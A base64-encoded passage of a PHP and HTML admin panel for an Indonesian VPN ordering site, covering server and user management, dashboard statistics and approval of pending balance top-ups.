GVydnBuL2FkbWluLz9zYXZlZD0xJyk7IGV4aXQ7CiAgICB9CgogICAgaWYgKCRhY3Q9PT0ndG9nZ2xlX3NlcnZlcicpIHsKICAgICAgICAkc2lkPShpbnQpJF9QT1NUWydzZXJ2ZXJfaWQnXTsgJHM9c2FuaXRpemUoJF9QT1NUWydzdGF0dXMnXSk7CiAgICAgICAgJGRiLT5wcmVwYXJlKCJVUERBVEUgc2VydmVycyBTRVQgc3RhdHVzPT8gV0hFUkUgaWQ9PyIpLT5leGVjdXRlKFskcywkc2lkXSk7CiAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogL29yZGVydnBuL2FkbWluLycpOyBleGl0OwogICAgfQoKICAgIGlmICgkYWN0PT09J2RlbGV0ZV91c2VyJykgewogICAgICAgICR1aWQ9KGludCkkX1BPU1RbJ3VzZXJfaWQnXTsKICAgICAgICBpZigkdWlkIT09JHNlc3Npb25bJ3VzZXJfaWQnXSkgJGRiLT5wcmVwYXJlKCJERUxFVEUgRlJPTSB1c2VycyBXSEVSRSBpZD0/IiktPmV4ZWN1dGUoWyR1aWRdKTsKICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiAvb3JkZXJ2cG4vYWRtaW4vJyk7IGV4aXQ7CiAgICB9Cn0KCi8vIFN0YXRzCiRzdGF0cyA9IFsKICAgICd1c2VycycgICAgPT4gJGRiLT5xdWVyeSgiU0VMRUNUIENPVU5UKCopIEZST00gdXNlcnMgV0hFUkUgcm9sZT0ndXNlciciKS0+ZmV0Y2hDb2x1bW4oKSwKICAgICdha3VuJyAgICAgPT4gJGRiLT5xdWVyeSgiU0VMRUNUIENPVU5UKCopIEZST00gdnBuX2FjY291bnRzIFdIRVJFIHN0YXR1cz0nYWN0aXZlJyIpLT5mZXRjaENvbHVtbigpLAogICAgJ3RvcHVwX3AnICA9PiAkZGItPnF1ZXJ5KCJTRUxFQ1QgQ09VTlQoKikgRlJPTSB0b3B1cF9yZXF1ZXN0cyBXSEVSRSBzdGF0dXM9J3BlbmRpbmcnIiktPmZldGNoQ29sdW1uKCksCiAgICAncmV2ZW51ZScgID0+ICRkYi0+cXVlcnkoIlNFTEVDVCBDT0FMRVNDRShTVU0oYW1vdW50KSwwKSBGUk9NIHRyYW5zYWN0aW9ucyBXSEVSRSB0eXBlPSd0b3B1cCcgQU5EIHN0YXR1cz0nc3VjY2VzcyciKS0+ZmV0Y2hDb2x1bW4oKSwKICAgICdvcmRlcnMnICAgPT4gJGRiLT5xdWVyeSgiU0VMRUNUIENPVU5UKCopIEZST00gdHJhbnNhY3Rpb25zIFdIRVJFIHR5cGU9J29yZGVyJyIpLT5mZXRjaENvbHVtbigpLApdOwoKJHBlbmRpbmdUb3B1cHMgPSAkZGItPnF1ZXJ5KCJTRUxFQ1QgdHIuKiwgdS51c2VybmFtZSwgdS5lbWFpbCBGUk9NIHRvcHVwX3JlcXVlc3RzIHRyIEpPSU4gdXNlcnMgdSBPTiB0ci51c2VyX2lkPXUuaWQgV0hFUkUgdHIuc3RhdHVzPSdwZW5kaW5nJyBPUkRFUiBCWSB0ci5jcmVhdGVkX2F0IERFU0MiKS0+ZmV0Y2hBbGwoKTsKJGFsbFRvcHVwcyAgICAgPSAkZGItPnF1ZXJ5KCJTRUxFQ1QgdHIuKiwgdS51c2VybmFtZSBGUk9NIHRvcHVwX3JlcXVlc3RzIHRyIEpPSU4gdXNlcnMgdSBPTiB0ci51c2VyX2lkPXUuaWQgT1JERVIgQlkgdHIuY3JlYXRlZF9hdCBERVNDIExJTUlUIDUwIiktPmZldGNoQWxsKCk7CiRzZXJ2ZXJzICAgICAgID0gJGRiLT5xdWVyeSgiU0VMRUNUICogRlJPTSBzZXJ2ZXJzIE9SREVSIEJZIG5hbWFfc2VydmVyIiktPmZldGNoQWxsKCk7CiR1c2VycyAgICAgICAgID0gJGRiLT5xdWVyeSgiU0VMRUNUICogRlJPTSB1c2VycyBPUkRFUiBCWSBjcmVhdGVkX2F0IERFU0MgTElNSVQgMTAwIiktPmZldGNoQWxsKCk7CiRvcmRlcnMgICAgICAgID0gJGRiLT5xdWVyeSgiU0VMRUNUIHQuKiwgdS51c2VybmFtZSBGUk9NIHRyYW5zYWN0aW9ucyB0IEpPSU4gdXNlcnMgdSBPTiB0LnVzZXJfaWQ9dS5pZCBXSEVSRSB0LnR5cGU9J29yZGVyJyBPUkRFUiBCWSB0LmNyZWF0ZWRfYXQgREVTQyBMSU1JVCA1MCIpLT5mZXRjaEFsbCgpOwokYWxsQWt1bnMgICAgICA9ICRkYi0+cXVlcnkoIlNFTEVDVCB2YS4qLCB1LnVzZXJuYW1lIGFzIHVuYW1lLCBzLm5hbWFfc2VydmVyIEZST00gdnBuX2FjY291bnRzIHZhIEpPSU4gdXNlcnMgdSBPTiB2YS51c2VyX2lkPXUuaWQgSk9JTiBzZXJ2ZXJzIHMgT04gdmEuc2VydmVyX2lkPXMuaWQgT1JERVIgQlkgdmEuY3JlYXRlZF9hdCBERVNDIExJTUlUIDUwIiktPmZldGNoQWxsKCk7CgokYXBwTmFtZSA9IGdldFNldHRpbmcoJ2FwcF9uYW1lJywnT3JkZXJWUE4nKTsKJHNhdmVkICAgPSBpc3NldCgkX0dFVFsnc2F2ZWQnXSk7Cj8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJpZCI+CjxoZWFkPgo8bWV0YSBjaGFyc2V0PSJVVEYtOCI+PG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCxpbml0aWFsLXNjYWxlPTEiPgo8dGl0bGU+QWRtaW4g4oCUIDw/PSRhcHBOYW1lPz48L3RpdGxlPgo8c3R5bGU+Cip7Ym94LXNpemluZzpib3JkZXItYm94O21hcmdpbjowO3BhZGRpbmc6MH0KOnJvb3R7LS1iZzojMDYwZDFhOy0tY2FyZDojMGQxYjJlOy0tY2FyZDI6IzBmMjEzODstLWJvcmRlcjojMWUzYTVmOy0tdGV4dDojZjFmNWY5Oy0tbXV0ZWQ6IzQ3NTU2OTstLWJsdWU6IzNiODJmNjstLWN5YW46IzBlYTVlOTstLWdyZWVuOiMxMGI5ODE7LS1yZWQ6I2VmNDQ0NDstLXllbGxvdzojZjU5ZTBiOy0tcHVycGxlOiM4YjVjZjZ9CmJvZHl7Zm9udC1mYW1pbHk6J1NlZ29lIFVJJyxzeXN0ZW0tdWksc2Fucy1zZXJpZjtiYWNrZ3JvdW5kOnZhcigtLWJnKTtjb2xvcjp2YXIoLS10ZXh0KTttaW4taGVpZ2h0OjEwMHZofQoudG9wYmFye2JhY2tncm91bmQ6cmdiYSgxMywyNyw0NiwuOTUpO2JvcmRlci1ib3R0b206MXB4IHNvbGlkIHZhcigtLWJvcmRlcik7cGFkZGluZzouODc1cmVtIDEuNXJlbTtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuO3Bvc2l0aW9uOnN0aWNreTt0b3A6MDt6LWluZGV4OjEwMDtiYWNrZHJvcC1maWx0ZXI6Ymx1cigxMHB4KX0KLnRvcGJhci1icmFuZHtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDouNzVyZW07Zm9udC1zaXplOjFyZW07Zm9udC13ZWlnaHQ6ODAwO2JhY2tncm91bmQ6bGluZWFyLWdyYWRpZW50KDEzNWRlZyx2YXIoLS1ibHVlKSx2YXIoLS1jeWFuKSk7LXdlYmtpdC1iYWNrZ3JvdW5kLWNsaXA6dGV4dDstd2Via2l0LXRleHQtZmlsbC1jb2xvcjp0cmFuc3BhcmVudH0KLmFkbWluLWJhZGdle2JhY2tncm91bmQ6bGluZWFyLWdyYWRpZW50KDEzNWRlZyx2YXIoLS1wdXJwbGUpLCM2ZDI4ZDkpO2NvbG9yOiNmZmY7Zm9udC1zaXplOi43cmVtO2ZvbnQtd2VpZ2h0OjcwMDtwYWRkaW5nOi4ycmVtIC42cmVtO2JvcmRlci1yYWRpdXM6OTlweDstd2Via2l0LXRleHQtZmlsbC1jb2xvcjojZmZmfQoudGFic3tkaXNwbGF5OmZsZXg7Z2FwOi4yNXJlbTtwYWRkaW5nOi43NXJlbSAxLjVyZW07Ym9yZGVyLWJvdHRvbToxcHggc29saWQgdmFyKC0tYm9yZGVyKTtvdmVyZmxvdy14OmF1dG87ZmxleC13cmFwOm5vd3JhcH0KLnRhYi1idG57cGFkZGluZzouNXJlbSAxcmVtO2JvcmRlcjpub25lO2JhY2tncm91bmQ6dHJhbnNwYXJlbnQ7Y29sb3I6dmFyKC0tbXV0ZWQpO2ZvbnQtc2l6ZTouOHJlbTtmb250LXdlaWdodDo2MDA7Y3Vyc29yOnBvaW50ZXI7Zm9udC1mYW1pbHk6aW5oZXJpdDtib3JkZXItcmFkaXVzOjhweDt3aGl0ZS1zcGFjZTpub3dyYXA7dHJhbnNpdGlvbjouMnN9Ci50YWItYnRuLmFjdGl2ZXtiYWNrZ3JvdW5kOnZhcigtLWNhcmQyKTtjb2xvcjp2YXIoLS10ZXh0KTtib3JkZXI6MXB4IHNvbGlkIHZhcigtLWJvcmRlcil9Ci5jb250ZW50e3BhZGRpbmc6MS4yNXJlbSAxLjVyZW07bWF4LXdpZHRoOjEyMDBweDttYXJnaW46MCBhdXRvfQouc3RhdHN7ZGlzcGxheTpncmlkO2dyaWQtdGVtcGxhdGUtY29sdW1uczpyZXBlYXQoYXV0by1maXQsbWlubWF4KDE1MHB4LDFmcikpO2dhcDoxcmVtO21hcmdpbi1ib3R0b206MS4yNXJlbX0KLnN0YXQtY2FyZHtiYWNrZ3JvdW5kOnZhcigtLWNhcmQpO2JvcmRlcjoxcHggc29saWQgdmFyKC0tYm9yZGVyKTtib3JkZXItcmFkaXVzOjEycHg7cGFkZGluZzoxcmVtfQouc3RhdC1pY29ue2ZvbnQtc2l6ZToxLjI1cmVtO21hcmdpbi1ib3R0b206LjVyZW19Ci5zdGF0LXZhbHtmb250LXNpemU6MS4yNXJlbTtmb250LXdlaWdodDo4MDB9Ci5zdGF0LWxhYmVse2ZvbnQtc2l6ZTouNzJyZW07Y29sb3I6dmFyKC0tbXV0ZWQpO21hcmdpbi10b3A6LjE1cmVtfQouY2FyZHtiYWNrZ3JvdW5kOnZhcigtLWNhcmQpO2JvcmRlcjoxcHggc29saWQgdmFyKC0tYm9yZGVyKTtib3JkZXItcmFkaXVzOjE0cHg7b3ZlcmZsb3c6aGlkZGVuO21hcmdpbi1ib3R0b206MXJlbX0KLmNhcmQtaGVhZGVye3BhZGRpbmc6Ljg3NXJlbSAxLjI1cmVtO2JvcmRlci1ib3R0b206MXB4IHNvbGlkIHZhcigtLWJvcmRlcik7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtqdXN0aWZ5LWNvbnRlbnQ6c3BhY2UtYmV0d2VlbjtmbGV4LXdyYXA6d3JhcDtnYXA6LjVyZW19Ci5jYXJkLXRpdGxle2ZvbnQtc2l6ZTouOXJlbTtmb250LXdlaWdodDo3MDB9Ci5jYXJkLWJvZHl7cGFkZGluZzoxLjI1cmVtfQp0YWJsZXt3aWR0aDoxMDAlO2JvcmRlci1jb2xsYXBzZTpjb2xsYXBzZTtmb250LXNpemU6LjgycmVtfQp0aHtwYWRkaW5nOi42cmVtIC44NzVyZW07dGV4dC1hbGlnbjpsZWZ0O2NvbG9yOnZhcigtLW11dGVkKTtmb250LXNpemU6LjcycmVtO2ZvbnQtd2VpZ2h0OjYwMDt0ZXh0LXRyYW5zZm9ybTp1cHBlcmNhc2U7bGV0dGVyLXNwYWNpbmc6LjA1ZW07Ym9yZGVyLWJvdHRvbToxcHggc29saWQgdmFyKC0tYm9yZGVyKTt3aGl0ZS1zcGFjZTpub3dyYXB9CnRke3BhZGRpbmc6LjY1cmVtIC44NzVyZW07Ym9yZGVyLWJvdHRvbToxcHggc29saWQgIzBhMTYyODt2ZXJ0aWNhbC1hbGlnbjptaWRkbGV9CnRyOmxhc3QtY2hpbGQgdGR7Ym9yZGVyLWJvdHRvbTpub25lfQp0cjpob3ZlciB0ZHtiYWNrZ3JvdW5kOiMwYTFmMzV9Ci5iYWRnZXtkaXNwbGF5OmlubGluZS1ibG9jaztwYWRkaW5nOi4ycmVtIC41NXJlbTtib3JkZXItcmFkaXVzOjVweDtmb250LXNpemU6LjY4cmVtO2ZvbnQtd2VpZ2h0OjcwMDt0ZXh0LXRyYW5zZm9ybTp1cHBlcmNhc2V9Ci5iLXBlbmRpbmd7YmFja2dyb3VuZDojOTI0MDBlMjI7Y29sb3I6dmFyKC0teWVsbG93KTtib3JkZXI6MXB4IHNvbGlkICM5MjQwMGU0NH0KLmItYXBwcm92ZWR7YmFja2dyb3VuZDojMDY0ZTNiMjI7Y29sb3I6dmFyKC0tZ3JlZW4pO2JvcmRlcjoxcHggc29saWQgIzA2NWY0NjQ0fQouYi1yZWplY3RlZHtiYWNrZ3JvdW5kOiM3ZjFkMWQyMjtjb2xvcjp2YXIoLS1yZWQpO2JvcmRlcjoxcHggc29saWQgIzdmMWQxZDQ0fQouYi1hY3RpdmV7YmFja2dyb3VuZDojMDY0ZTNiMjI7Y29sb3I6dmFyKC0tZ3JlZW4pO2JvcmRlcjoxcHggc29saWQgIzA2NWY0NjQ0fQouYi1yZWFkeXtiYWNrZ3JvdW5kOiMwNjRlM2IyMjtjb2xvcjp2YXIoLS1ncmVlbil9Ci5iLW9mZmxpbmV7YmFja2dyb3VuZDojN2YxZDFkMjI7Y29sb3I6dmFyKC0tcmVkKX0KLmItbWFpbnRlbmFuY2V7YmFja2dyb3VuZDojOTI0MDBlMjI7Y29sb3I6dmFyKC0teWVsbG93KX0KLmJ0bntkaXNwbGF5OmlubGluZS1mbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6LjNyZW07cGFkZGluZzouNHJlbSAuODc1cmVtO2JvcmRlci1yYWRpdXM6N3B4O2ZvbnQtc2l6ZTouNzhyZW07Zm9udC13ZWlnaHQ6NjAwO2N1cnNvcjpwb2ludGVyO2JvcmRlcjpub25lO2ZvbnQtZmFtaWx5OmluaGVyaXQ7dGV4dC1kZWNvcmF0aW9uOm5vbmU7dHJhbnNpdGlvbjouMnM7d2hpdGUtc3BhY2U6bm93cmFwfQouYnRuLXByaW1hcnl7YmFja2dyb3VuZDpsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCMyNTYzZWIsIzBlYTVlOSk7Y29sb3I6I2ZmZn0KLmJ0bi1ncmVlbntiYWNrZ3JvdW5kOmxpbmVhci1ncmFkaWVudCgxMzVkZWcsIzA1OTY2OSwjMTBiOTgxKTtjb2xvcjojZmZmfQouYnRuLXJlZHtiYWNrZ3JvdW5kOmxpbmVhci1ncmFkaWVudCgxMzVkZWcsI2RjMjYyNiwjZWY0NDQ0KTtjb2xvcjojZmZmfQouYnRuLW91dGxpbmV7YmFja2dyb3VuZDp0cmFuc3BhcmVudDtib3JkZXI6MXB4IHNvbGlkIHZhcigtLWJvcmRlcik7Y29sb3I6dmFyKC0tbXV0ZWQpfQouYnRuLW91dGxpbmU6aG92ZXJ7Ym9yZGVyLWNvbG9yOnZhcigtLWJsdWUpO2NvbG9yOnZhcigtLWJsdWUpfQouYnRuLXllbGxvd3tiYWNrZ3JvdW5kOmxpbmVhci1ncmFkaWVudCgxMzVkZWcsI2Q5NzcwNiwjZjU5ZTBiKTtjb2xvcjojZmZmfQppbnB1dCxzZWxlY3QsdGV4dGFyZWF7d2lkdGg6MTAwJTtwYWRkaW5nOi42cmVtIC44NzVyZW07YmFja2dyb3VuZDojMGExNjI4O2JvcmRlcjoxcHggc29saWQgdmFyKC0tYm9yZGVyKTtib3JkZXItcmFkaXVzOjhweDtjb2xvcjp2YXIoLS10ZXh0KTtmb250LXNpemU6Ljg3NXJlbTtmb250LWZhbWlseTppbmhlcml0O291dGxpbmU6bm9uZTttYXJnaW4tYm90dG9tOi43NXJlbX0KaW5wdXQ6Zm9jdXMsc2VsZWN0OmZvY3VzLHRleHRhcmVhOmZvY3Vze2JvcmRlci1jb2xvcjp2YXIoLS1ibHVlKX0KbGFiZWx7ZGlzcGxheTpibG9jaztmb250LXNpemU6Ljc1cmVtO2ZvbnQtd2VpZ2h0OjYwMDtjb2xvcjp2YXIoLS1tdXRlZCk7bWFyZ2luLWJvdHRvbTouMjVyZW07dGV4dC10cmFuc2Zvcm06dXBwZXJjYXNlO2xldHRlci1zcGFjaW5nOi4wNWVtfQouZ3JpZDJ7ZGlzcGxheTpncmlkO2dyaWQtdGVtcGxhdGUtY29sdW1uczoxZnIgMWZyO2dhcDoxcmVtfQouZ3JpZDN7ZGlzcGxheTpncmlkO2dyaWQtdGVtcGxhdGUtY29sdW1uczpyZXBlYXQoMywxZnIpO2dhcDoxcmVtfQouYWxlcnR7cGFkZGluZzouNzVyZW0gMXJlbTtib3JkZXItcmFkaXVzOjEwcHg7Zm9udC1zaXplOi44NXJlbTttYXJnaW4tYm90dG9tOjFyZW19Ci5hbGVydC1zdWNjZXNze2JhY2tncm91bmQ6IzA2NGUzYjIyO2JvcmRlcjoxcHggc29saWQgIzA2NWY0NjU1O2NvbG9yOiM2ZWU3Yjd9Ci5zZWN0aW9uLXRpdGxle2ZvbnQtc2l6ZTouODVyZW07Zm9udC13ZWlnaHQ6NzAwO2NvbG9yOnZhcigtLWJsdWUpO21hcmdpbjouNzVyZW0gMCAuNXJlbTt0ZXh0LXRyYW5zZm9ybTp1cHBlcmNhc2U7bGV0dGVyLXNwYWNpbmc6LjA1ZW07ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6LjRyZW19Ci5vdmVyZmxvdy14e292ZXJmbG93LXg6YXV0b30KLnBhZ2V7ZGlzcGxheTpub25lfS5wYWdlLmFjdGl2ZXtkaXNwbGF5OmJsb2NrfQpAbWVkaWEobWF4LXdpZHRoOjc2OHB4KXsuZ3JpZDIsLmdyaWQze2dyaWQtdGVtcGxhdGUtY29sdW1uczoxZnJ9LnRhYnN7Z2FwOi4xNXJlbX0uYnRue3BhZGRpbmc6LjM1cmVtIC42cmVtO2ZvbnQtc2l6ZTouNzJyZW19fQo8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5Pgo8ZGl2IGNsYXNzPSJ0b3BiYXIiPgogIDxkaXYgY2xhc3M9InRvcGJhci1icmFuZCI+CiAgICA8c3Bhbj48Pz1nZXRTZXR0aW5nKCdhcHBfbG9nbycsJ/Cfk7YnKT8+PC9zcGFuPgogICAgPD89JGFwcE5hbWU/PiA8c3BhbiBjbGFzcz0iYWRtaW4tYmFkZ2UiPvCfkZEgQWRtaW48L3NwYW4+CiAgPC9kaXY+CiAgPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2dhcDouNXJlbTthbGlnbi1pdGVtczpjZW50ZXIiPgogICAgPGEgaHJlZj0iL29yZGVydnBuL2Rhc2hib2FyZC5waHAiIGNsYXNzPSJidG4gYnRuLW91dGxpbmUiPvCfj6AgVXNlciBQYW5lbDwvYT4KICAgIDxhIGhyZWY9Ii9vcmRlcnZwbi9hcGkvbG9nb3V0LnBocCIgY2xhc3M9ImJ0biBidG4tcmVkIj7wn5qqIExvZ291dDwvYT4KICA8L2Rpdj4KPC9kaXY+Cgo8ZGl2IGNsYXNzPSJ0YWJzIj4KICA8YnV0dG9uIGNsYXNzPSJ0YWItYnRuIGFjdGl2ZSIgb25jbGljaz0ic2hvd1RhYignZGFzaGJvYXJkJykiPvCfk4ogRGFzaGJvYXJkPC9idXR0b24+CiAgPGJ1dHRvbiBjbGFzcz0idGFiLWJ0biIgb25jbGljaz0ic2hvd1RhYigndG9wdXAnKSI+8J+SsCBUb3B1cCA8P3BocCBpZigkc3RhdHNbJ3RvcHVwX3AnXT4wKTo/PjxzcGFuIHN0eWxlPSJiYWNrZ3JvdW5kOnZhcigtLXJlZCk7Y29sb3I6I2ZmZjtmb250LXNpemU6LjY1cmVtO3BhZGRpbmc6LjFyZW0gLjRyZW07Ym9yZGVyLXJhZGl1czo5OXB4O21hcmdpbi1sZWZ0Oi4zcmVtIj48Pz0kc3RhdHNbJ3RvcHVwX3AnXT8+PC9zcGFuPjw/cGhwIGVuZGlmOz8+PC9idXR0b24+CiAgPGJ1dHRvbiBjbGFzcz0idGFiLWJ0biIgb25jbGljaz0ic2hvd1RhYignc2VydmVycycpIj7wn4yQIFNlcnZlcjwvYnV0dG9uPgogIDxidXR0b24gY2xhc3M9InRhYi1idG4iIG9uY2xpY2s9InNob3dUYWIoJ3VzZXJzJykiPvCfkaUgVXNlcnM8L2J1dHRvbj4KICA8YnV0dG9uIGNsYXNzPSJ0YWItYnRuIiBvbmNsaWNrPSJzaG93VGFiKCdvcmRlcnMnKSI+8J+bkiBMYXBvcmFuIE9yZGVyPC9idXR0b24+CiAgPGJ1dHRvbiBjbGFzcz0idGFiLWJ0biIgb25jbGljaz0ic2hvd1RhYignYWt1bnMnKSI+8J+TiyBBa3VuIFZQTjwvYnV0dG9uPgogIDxidXR0b24gY2xhc3M9InRhYi1idG4iIG9uY2xpY2s9InNob3dUYWIoJ3NldHRpbmdzJykiPuKame+4jyBQZW5nYXR1cmFuPC9idXR0b24+CjwvZGl2PgoKPGRpdiBjbGFzcz0iY29udGVudCI+CiAgPD9waHAgaWYoJHNhdmVkKTo/PjxkaXYgY2xhc3M9ImFsZXJ0IGFsZXJ0LXN1Y2Nlc3MiPuKchSBQZW5nYXR1cmFuIGJlcmhhc2lsIGRpc2ltcGFuITwvZGl2Pjw/cGhwIGVuZGlmOz8+CgogIDwhLS0gREFTSEJPQVJEIC0tPgogIDxkaXYgY2xhc3M9InBhZ2UgYWN0aXZlIiBpZD0idGFiLWRhc2hib2FyZCI+CiAgICA8ZGl2IGNsYXNzPSJzdGF0cyI+CiAgICAgIDxkaXYgY2xhc3M9InN0YXQtY2FyZCI+PGRpdiBjbGFzcz0ic3RhdC1pY29uIj7wn5GlPC9kaXY+PGRpdiBjbGFzcz0ic3RhdC12YWwiPjw/PSRzdGF0c1sndXNlcnMnXT8+PC9kaXY+PGRpdiBjbGFzcz0ic3RhdC1sYWJlbCI+VG90YWwgVXNlcnM8L2Rpdj48L2Rpdj4KICAgICAgPGRpdiBjbGFzcz0ic3RhdC1jYXJkIj48ZGl2IGNsYXNzPSJzdGF0LWljb24iPvCfk7Y8L2Rpdj48ZGl2IGNsYXNzPSJzdGF0LXZhbCI+PD89JHN0YXRzWydha3VuJ10/PjwvZGl2PjxkaXYgY2xhc3M9InN0YXQtbGFiZWwiPkFrdW4gQWt0aWY8L2Rpdj48L2Rpdj4KICAgICAgPGRpdiBjbGFzcz0ic3RhdC1jYXJkIj48ZGl2IGNsYXNzPSJzdGF0LWljb24iPvCfm5I8L2Rpdj48ZGl2IGNsYXNzPSJzdGF0LXZhbCI+PD89JHN0YXRzWydvcmRlcnMnXT8+PC9kaXY+PGRpdiBjbGFzcz0ic3RhdC1sYWJlbCI+VG90YWwgT3JkZXI8L2Rpdj48L2Rpdj4KICAgICAgPGRpdiBjbGFzcz0ic3RhdC1jYXJkIj48ZGl2IGNsYXNzPSJzdGF0LWljb24iPvCfkrA8L2Rpdj48ZGl2IGNsYXNzPSJzdGF0LXZhbCI+PD89Zm9ybWF0UnVwaWFoKCRzdGF0c1sncmV2ZW51ZSddKT8+PC9kaXY+PGRpdiBjbGFzcz0ic3RhdC1sYWJlbCI+VG90YWwgUmV2ZW51ZTwvZGl2PjwvZGl2PgogICAgICA8ZGl2IGNsYXNzPSJzdGF0LWNhcmQiPjxkaXYgY2xhc3M9InN0YXQtaWNvbiI+4o+zPC9kaXY+PGRpdiBjbGFzcz0ic3RhdC12YWwiIHN0eWxlPSJjb2xvcjp2YXIoLS15ZWxsb3cpIj48Pz0kc3RhdHNbJ3RvcHVwX3AnXT8+PC9kaXY+PGRpdiBjbGFzcz0ic3RhdC1sYWJlbCI+VG9wdXAgUGVuZGluZzwvZGl2PjwvZGl2PgogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjYXJkIj4KICAgICAgPGRpdiBjbGFzcz0iY2FyZC1oZWFkZXIiPjxkaXYgY2xhc3M9ImNhcmQtdGl0bGUiPuKPsyBUb3B1cCBQZW5kaW5nPC9kaXY+PC9kaXY+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgPD9waHAgaWYoZW1wdHkoJHBlbmRpbmdUb3B1cHMpKTo/PjxwIHN0eWxlPSJjb2xvcjp2YXIoLS1tdXRlZCk7Zm9udC1zaXplOi44NzVyZW0iPlRpZGFrIGFkYSB0b3B1cCBwZW5kaW5nLjwvcD4KICAgICAgICA8P3BocCBlbHNlOiBmb3JlYWNoKCRwZW5kaW5nVG9wdXBzIGFzICR0KTo/PgogICAgICAgIDxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7anVzdGlmeS1jb250ZW50OnNwYWNlLWJldHdlZW47cGFkZGluZzouNzVyZW07YmFja2dyb3VuZDp2YXIoLS1jYXJkMik7Ym9yZGVyLXJhZGl1czoxMHB4O21hcmdpbi1ib3R0b206LjVyZW07Ym9yZGVyOjFweCBzb2xpZCAjOTI0MDBlNDQ7Z2FwOjFyZW07ZmxleC13cmFwOndyYXAiPgogICAgICAgICAgPGRpdj4KICAgICAgICAgICAgPGRpdiBzdHlsZT0iZm9udC13ZWlnaHQ6NjAwO2ZvbnQtc2l6ZTouODc1cmVtIj48Pz1odG1sc3BlY2lhbGNoYXJzKCR0Wyd1c2VybmFtZSddKT8+PC9kaXY+CiAgICAgICAgICAgIDxkaXYgc3R5bGU9ImZvbnQtc2l6ZTouNzVyZW07Y29sb3I6dmFyKC0tbXV0ZWQpIj48Pz1odG1sc3BlY2lhbGNoYXJzKCR0WydwYXltZW50X21ldGhvZCddKT8+IMK3IDw/PWRhdGUoJ2QgTSBZIEg6aScsc3RydG90aW1lKCR0WydjcmVhdGVkX2F0J10pKT8+PC9kaXY+CiAgICAgICAgICAgIDw/cGhwIGlmKCR0WydidWt0aV90cmFuc2ZlciddKTo/PjxhIGhyZWY9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoJHRbJ2J1a3RpX3RyYW5zZmVyJ10pPz4iIHRhcmdldD0iX2JsYW5rIiBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lIiBzdHlsZT0ibWFyZ2luLXRvcDouMzVyZW07Zm9udC1zaXplOi43cmVtIj7wn5a8IEJ1a3RpPC9hPjw/cGhwIGVuZGlmOz8+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDxkaXYgc3R5bGU9ImZvbnQtc2l6ZToxcmVtO2ZvbnQtd2VpZ2h0OjgwMDtjb2xvcjp2YXIoLS15ZWxsb3cpIj48Pz1mb3JtYXRSdXBpYWgoJHRbJ2Ftb3VudCddKT8+PC9kaXY+CiAgICAgICAgICA8ZGl2IHN0eWxlPSJkaXNwbGF5OmZsZXg7Z2FwOi40cmVtO2ZsZXgtd3JhcDp3cmFwIj4KICAgICAgICAgICAgPGZvcm0gbWV0aG9kPSJQT1NUIiBzdHlsZT0iZGlzcGxheTppbmxpbmUiPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFjdGlvbiIgdmFsdWU9ImFwcHJvdmVfdG9wdXAiPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InRvcHVwX2lkIiB2YWx1ZT0iPD89JHRbJ2lkJ10/PiI+PGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLWdyZWVuIj7inIUgQXBwcm92ZTwvYnV0dG9uPjwvZm9ybT4KICAgICAgICAgICAgPGZvcm0gbWV0aG9kPSJQT1NUIiBzdHlsZT0iZGlzcGxheTppbmxpbmUiPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFjdGlvbiIgdmFsdWU9InJlamVjdF90b3B1cCI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idG9wdXBfaWQiIHZhbHVlPSI8Pz0kdFsnaWQnXT8+Ij48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJub3RlIiB2YWx1ZT0iRGl0b2xhayBhZG1pbiI+PGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXJlZCI+4p2MIFRvbGFrPC9idXR0b24+PC9mb3JtPgogICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPD9waHAgZW5kZm9yZWFjaDsgZW5kaWY7Pz4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICA8L2Rpdj4KCiAgPCEtLSBUT1BVUCAtLT4KICA8ZGl2IGNsYXNzPSJwYWdlIiBpZD0idGFiLXRvcHVwIj4KICAgIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciI+PGRpdiBjbGFzcz0iY2FyZC10aXRsZSI+8J+SsCBTZW11YSBSaXdheWF0IFRvcHVwPC9kaXY+PC9kaXY+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSBvdmVyZmxvdy14Ij4KICAgICAgICA8dGFibGU+CiAgICAgICAgICA8dGhlYWQ+PHRyPjx0aD5Vc2VyPC90aD48dGg+Tm9taW5hbDwvdGg+PHRoPk1ldG9kZTwvdGg+PHRoPlN0YXR1czwvdGg+PHRoPlRhbmdnYWw8L3RoPjx0aD5Ba3NpPC90aD48L3RyPjwvdGhlYWQ+CiAgICAgICAgICA8dGJvZHk+CiAgICAgICAgICA8P3BocCBmb3Jl